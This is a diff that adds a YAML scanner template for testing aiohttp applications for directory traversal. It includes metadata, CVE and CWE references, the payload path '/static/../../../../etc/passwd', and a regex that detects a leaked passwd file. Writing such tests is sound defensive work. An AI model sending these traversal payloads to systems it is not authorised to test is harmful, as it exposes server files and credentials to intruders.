@@ -1,0 +1,68 @@
+id: AIOHTTP_LFI
+info:
+  name: "aiohttp Directory Traversal Test"
+  description: "The aiohttp Directory Traversal Test identifies vulnerabilities in an aiohttp-based application that could allow attackers to access files outside the intended directory by manipulating the URL path. This can occur when user input is improperly handled, allowing traversal sequences like `../` to access sensitive or restricted files on the server. If exploited, this could lead to the leakage of sensitive information or unauthorized file access. Proper input sanitization and path restrictions are necessary to prevent such directory traversal attacks in aiohttp applications."
+  details: "The aiohttp Directory Traversal Test checks for vulnerabilities where an attacker can manipulate URL paths to access files outside the intended directory in an aiohttp application. By exploiting improper input validation, attackers can use traversal sequences (e.g., `../`) to navigate through the file system and potentially access sensitive files, configuration data, or system files. This could result in unauthorized data exposure or security breaches. Mitigation includes ensuring that file paths are properly sanitized, using absolute paths, and restricting access to sensitive directories."
+  impact: "The impact of an aiohttp Directory Traversal vulnerability is significant, as it allows attackers to gain unauthorized access to sensitive files or configuration data on the server. This could lead to data leakage, exposure of credentials, or even compromise of the system. Attackers could also use this access to gather information for further attacks, potentially escalating privileges or causing a system breach. Proper input validation, path restrictions, and access controls are essential to mitigate these risks."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: AIOHTTP_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - '/static/../../../../etc/passwd'
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "${paths}"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex: "root:.*:0:0:"
+  response_headers:
+    contains_either: aiohttp
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "application/octet-stream"
+strategy:
+  run_once: /
